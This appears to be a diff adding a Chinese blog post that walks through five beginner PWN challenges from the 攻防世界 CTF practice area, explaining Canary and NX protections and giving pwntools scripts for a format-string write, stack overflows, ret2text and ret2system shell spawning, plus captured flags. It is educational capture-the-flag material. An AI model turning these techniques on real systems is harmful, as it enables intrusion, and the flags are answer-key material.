@@ -1,0 +1,694 @@
+<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>攻防世界PWN新手练习区WP | Du4t的博客 | Du4t~~~~</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="PWN">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.4">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	false,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"Du4t","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class>
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/100.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Du4t</h5>
+          <a href="mailto:610109615@qq.com" title="610109615@qq.com" class="mail">
+            
+              <span>6</span>
+            
+              <span>1</span>
+            
+              <span>0</span>
+            
+              <span>1</span>
+            
+              <span>0</span>
+            
+              <span>9</span>
+            
+              <span>6</span>
+            
+              <span>1</span>
+            
+              <span>5</span>
+            
+              <span>@</span>
+            
+              <span>q</span>
+            
+              <span>q</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+        <ul class="menu-link">
+          
+              <li>
+                <a href="https://github.com/Du4t" target="_blank">
+                  <i class="icon icon-lg icon-github"></i>
+                </a>
+              </li>
+            
+        </ul>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class>
+              <a href="/">
+                <i class="icon icon-lg icon-home"></i>
+                HOME
+              </a>
+            </li>
+        
+            <li class>
+              <a href="/categories">
+                <i class="icon icon-lg icon-th-list"></i>
+                CATEGORIES
+              </a>
+            </li>
+        
+            <li class>
+              <a href="/tags">
+                <i class="icon icon-lg icon-tags"></i>
+                TAGS
+              </a>
+            </li>
+        
+            <li class>
+              <a href="/archives">
+                <i class="icon icon-lg icon-archives"></i>
+                ARCHIVES
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>攻防世界PWN新手练习区WP</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">攻防世界PWN新手练习区WP</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-10-08T12:17:25.000Z" itemprop="datePublished" class="page-time">
+  2019-10-08
+</time>
+
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left">
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-攻防世界PWN新手练习区WP" class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">攻防世界PWN新手练习区WP</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-10-08 20:17:25" datetime="2019-10-08T12:17:25.000Z" itemprop="datePublished">2019-10-08</time>
+
+            
+
+
+            
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <meta name="generator" content="Hexo 3.9.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><blockquote>
+<p>近期笨逼菜鸡开始接触PWN 刷了刷攻防世界的题目 在这里记录下自己的学习成果</p>
+</blockquote>
+<h2 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h2><p>首先是PWN题的常规起手式 查壳查保护 捎带着看下程序信息<br>发现无壳 但是存在Canary保护和NX保护</p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://img-blog.csdnimg.cn/20190928183818798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" title="在这里插入图片描述" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20190928183818798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" title class></a>
+                <p>在这里插入图片描述</p>
+            </figure>
+
+<blockquote>
+<p>这里先讲一下什么是Canary保护<br>Canary保护主要是用来防护栈溢出的 在开启Canary保护程序调用函数的时候 会在栈中压入一个随机Canary值 在函数结束的时候程序会判断Canary值是否发生变动 如果发生变动就认为是程序遭到了攻击 程序直接异常退出 Canary值通常和函数返回地址在栈中相连 主要是防护攻击者更改程序返回地址来执行shellcode<br>这里我们直接拿本题做例子</p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://img-blog.csdnimg.cn/20190928185413790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" title="在这里插入图片描述" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20190928185413790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" title class></a>
+                <p>在这里插入图片描述</p>
+            </figure>可以明确看到程序现在在存储Canary值 我们在数据下硬件读写断点 然后让程序跑起来
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://img-blog.csdnimg.cn/20190928185721986.png" title="在这里插入图片描述" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20190928185721986.png" alt="在这里插入图片描述" title class></a>
+                <p>在这里插入图片描述</p>
+            </figure>这里在函数末尾取出Canary值 如果与刚开始的值不一致 执行stack_chk_fail函数 
+<p>对于如何绕过Canary保护 基本思路是利用各种漏洞 先泄漏出来Canary的地址 然后取出值 等溢出过后再还原 当然具体如何利用还得就题论题</p>
+</blockquote>
+<blockquote>
+<p>同时也讲一下NX保护吧 NX保护一般是不可绕过的 他是禁止了栈执行 也就是即使你写入了shellcode 但是如果NX保护开启的话 也是不能在栈上执行的</p>
+</blockquote>
+<p>回到本题 先随便执行下 就是输入用户名和留言 然后程序原样打印出来</p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://img-blog.csdnimg.cn/20190928190438694.png" title="在这里插入图片描述" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20190928190438694.png" alt="在这里插入图片描述" title class></a>
+                <p>在这里插入图片描述</p>
+            </figure>
+<p>没什么世纪大发现 那就常规操作 载入IDA吧</p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://img-blog.csdnimg.cn/20190928190601948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" title="在这里插入图片描述" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20190928190601948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" title class></a>
+                <p>在这里插入图片描述</p>
+            </figure>
+<p>发现程序存在格式化字符串漏洞 然后理解下程序逻辑 简单来说就是将pwnme变量的值更改为8就能拿到flag了 双击pwnme看一下 发现pwnme变量还是一个在bss段的全局变量 那基本思路已经有了</p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://img-blog.csdnimg.cn/20190928190855410.png" title="在这里插入图片描述" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20190928190855410.png" alt="在这里插入图片描述" title class></a>
+                <p>在这里插入图片描述</p>
+            </figure>
+<p>解法基本就是通过格式化字符串漏洞更改pwnme的值了 那第一步就是测试程序的回显位了 这里我的回显位是在第十位</p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://img-blog.csdnimg.cn/20190928191119916.png" title="在这里插入图片描述" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20190928191119916.png" alt="在这里插入图片描述" title class></a>
+                <p>在这里插入图片描述</p>
+            </figure>
+<p>那基本信息获取的差不多了 就可以开始编写脚本了</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"48339"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"please tell me your name:"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"Dust"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"leave your message please:"</span><span class="token punctuation">)</span>
+
+payload<span class="token operator">=</span>p32<span class="token punctuation">(</span><span class="token number">0x0804A068</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'0000%10$n'</span>
+
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>执行脚本即可</p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://img-blog.csdnimg.cn/20190928191836485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" title="在这里插入图片描述" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20190928191836485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" title class></a>
+                <p>在这里插入图片描述</p>
+            </figure>
+<p>得到flag:cyberpeace{bb8c9af83fb8e8913ed25c1d5cc41751}</p>
+<h2 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when_did_you_born"></a>when_did_you_born</h2><p>照例 日常开局…</p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://img-blog.csdnimg.cn/20190928193518639.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" title="在这里插入图片描述" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20190928193518639.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" title class></a>
+                <p>在这里插入图片描述</p>
+            </figure>
+<p>跑一下 没啥思路 直接载入IDA吧</p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://img-blog.csdnimg.cn/20190928193555812.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" title="在这里插入图片描述" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20190928193555812.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" title class></a>
+                <p>在这里插入图片描述</p>
+            </figure>
+<p>简单理解下 就是程序要求变量v5的值最后为1926 而程序开始的输入不允许输入1926…初看是自相矛盾的..话说哪道Pwn题给的初始条件不是自相矛盾的… 在代码中发现gets函数..因为gets函数不会限制输入的字符个数 初步怀疑是栈溢出 双击v4查看程序栈图</p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://img-blog.csdnimg.cn/20190928193834619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" title="在这里插入图片描述" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20190928193834619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" title class></a>
+                <p>在这里插入图片描述</p>
+            </figure>
+<p>没跑了 栈溢出 直接开始写脚本吧</p>
+<blockquote>
+<p>这里解释下为什么程序开启了Canary保护依然可以使用栈溢出漏洞 这是因为Canary保护主要是防护函数的返回地址不被篡改的 从这里程序的栈图就能看出 Canary值的变量名就是var_8 如果我们切换到汇编窗口 就能看到最后的校验使用的就是这个var_8变量</p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://img-blog.csdnimg.cn/20190928194120774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" title="在这里插入图片描述" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20190928194120774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" title class></a>
+                <p>在这里插入图片描述</p>
+            </figure>
+</blockquote>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"45209"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What's Your Birth?"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1925"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What's Your Name?"</span><span class="token punctuation">)</span>
+
+payload<span class="token operator">=</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1926</span><span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>执行即可 </p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://img-blog.csdnimg.cn/20190928205109233.png" title="在这里插入图片描述" data-fancybox="images"><img src="https://img-blog.csdnimg.cn/20190928205109233.png" alt="在这里插入图片描述" title class></a>
+                <p>在这里插入图片描述</p>
+            </figure>
+<p>得到flag:cyberpeace{5f65371d87fafa327d2c0d3e254cfab5}</p>
+<h2 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h2><p>正常起手式 查保护</p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://ae01.alicdn.com/kf/H03408bfb2a394554a5da866c4afb5f6d2.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/H03408bfb2a394554a5da866c4afb5f6d2.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>就开着NX保护 载入IDA看下</p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://ae01.alicdn.com/kf/Haafee49ea83e4c7daceca7c1ff7ba19eh.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/Haafee49ea83e4c7daceca7c1ff7ba19eh.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>简单理解下逻辑 就是判断一个程序中没有涉及到的变量 然后判断他的值 这明显就是在暗示是溢出 双击 dword_60106C看一下位置 发现是在bss段的全局变量 </p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://ae01.alicdn.com/kf/Ha6fea8becfaf4d178c61ad6ebe4b3e12A.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/Ha6fea8becfaf4d178c61ad6ebe4b3e12A.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>同时发现 程序主体中读入的变量和dword_60106C 仅相差4个字节的位置 而程序主体读入的大小是10个字节 确定此处存在溢出 直接编写脚本即可</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+a<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"33618"</span><span class="token punctuation">)</span>
+a<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token string">"~~ welcome to ctf ~~"</span><span class="token punctuation">)</span>
+a<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token string">"lets get helloworld for bof"</span><span class="token punctuation">)</span>
+payload<span class="token operator">=</span><span class="token number">4</span><span class="token operator">*</span><span class="token string">'A'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x6E756161</span><span class="token punctuation">)</span>
+a<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+a<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>运行脚本获得结果</p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://ae01.alicdn.com/kf/He5cc965499c84899b125e4cf23ba4067T.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/He5cc965499c84899b125e4cf23ba4067T.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>得到flag:cyberpeace{57c7b3fd167ec0630431800825423de0}</p>
+<h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><p>老样子 先查保护 发现除了NX全关 尝试着运行下程序 连个回显都没有 啥都看不出来 载入IDA</p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://ae01.alicdn.com/kf/H517f8a13e257412d9d6384d16df45a62Q.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/H517f8a13e257412d9d6384d16df45a62Q.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>发现主函数空空如也 有点头疼</p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://ae01.alicdn.com/kf/H3c2accf3c7744312b8eca1af4a1a8544u.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/H3c2accf3c7744312b8eca1af4a1a8544u.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>但是发现在函数表中 有个敏感函数<em>callsystem</em></p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://ae01.alicdn.com/kf/H7e89a7b80e54402bb3bdbe3df90d89b71.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/H7e89a7b80e54402bb3bdbe3df90d89b71.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>菜鸡此时就有点思路了 应该是劫持返回地址 然后让程序执行到callsystem函数 那么继续在主函数跟下去</p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://ae01.alicdn.com/kf/H2fafe4eb2bf444938173a2e4900c9fc7U.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/H2fafe4eb2bf444938173a2e4900c9fc7U.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>这个read就很明显了 read了200个字节..双击buf看下栈图<br>这里截不下图就不截了..简单算一下 80+8=88个字节 而程序读入100个字节 那就是溢出了…同时这里程序的地址随机化是关着的…不多说..开始写脚本吧..</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"35202"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token string">"Hello, World"</span><span class="token punctuation">)</span>
+payload<span class="token operator">=</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x400596</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>运行脚本得到结果 注意 因为程序是执行了 <em>/bin/sh</em>也就是打开了个终端 需要我们自己去执行获得flag..别说了..刚开始菜鸡等了半天..</p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://ae01.alicdn.com/kf/Ha764f1cb5400434a968e2aaf0cdbf41cw.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/Ha764f1cb5400434a968e2aaf0cdbf41cw.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>得到flag:cyberpeace{c07387d32eabb849023878563a5400ef}</p>
+<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>习惯性起手式</p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://ae01.alicdn.com/kf/Hc6b5266b6cb14cf395076de26d6e009ci.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/Hc6b5266b6cb14cf395076de26d6e009ci.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>一样没有开地址随机化 直接载入IDA </p>
+<p><a rel="攻防世界PWN新手练习区WP" href="https://ae01.alicdn.com/kf/Hce1df255f000422f9bb805cb6d16c2b7V.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/Hce1df255f000422f9bb805cb6d16c2b7V.png" alt></a></p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://ae01.alicdn.com/kf/H4584d6b417144896b3663437a7cb38aeI.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/H4584d6b417144896b3663437a7cb38aeI.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>本来没啥头绪 后来发现函数表中有敏感函数<em>system</em> 那大致思路形成 就是和上题差不多 但是我们在覆盖返回地址的同时 直接把栈修改成正常调用system(“/bin/sh”)的样子 同时发现在程序内存中也存有 <em>/bin/sh</em> 那开始写脚本吧</p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://ae01.alicdn.com/kf/Hf1c2df51b87d40cca5c3cea1ef3b77e42.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/Hf1c2df51b87d40cca5c3cea1ef3b77e42.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./level_2'</span><span class="token punctuation">)</span>
+sysadr<span class="token operator">=</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+shadr<span class="token operator">=</span>elf<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>
+sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"58030"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token string">"Input:"</span><span class="token punctuation">)</span>
+payload<span class="token operator">=</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x8c</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>sysadr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>shadr<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<blockquote>
+<p>这里解释下payload吧 因为在函数调用时除去保存现场外 先入栈的就是返回地址 这里的 <em>p32(0)</em> 就是充当返回地址用的 当然因为此处我们直接打开了终端 根本就不需要程序返回 所以随便写就好了 然后就是参数入栈 具体是从左向右 还是从右向左是调用协议规定的 这需要具体程序具体分析 </p>
+</blockquote>
+<p>执行脚本得到结果</p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://ae01.alicdn.com/kf/Hafe199f5112746a8a6d3ec0c1ac63bf1o.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/Hafe199f5112746a8a6d3ec0c1ac63bf1o.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>flag:cyberpeace{984f929f5fdae818c75ee89278e36753}</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2019-10-08T12:18:00.979Z" itemprop="dateUpdated">2019-10-08 20:18:00</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2019/10/08/gong-fang-shi-jie-pwn-xin-shou-lian-xi-qu-wp/" target="_blank" rel="external">http://Du4t.github.io/2019/10/08/gong-fang-shi-jie-pwn-xin-shou-lian-xi-qu-wp/</a>
+        
+    </div>
+    <footer>
+        <a href="http://Du4t.github.io">
+            <img src="/img/100.jpg" alt="Du4t">
+            Du4t
+        </a>
+    </footer>
+</blockquote>
+
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/">PWN</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://Du4t.github.io/2019/10/08/gong-fang-shi-jie-pwn-xin-shou-lian-xi-qu-wp/&title=《攻防世界PWN新手练习区WP》 — Du4t的博客&pic=http://Du4t.github.io/img/100.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
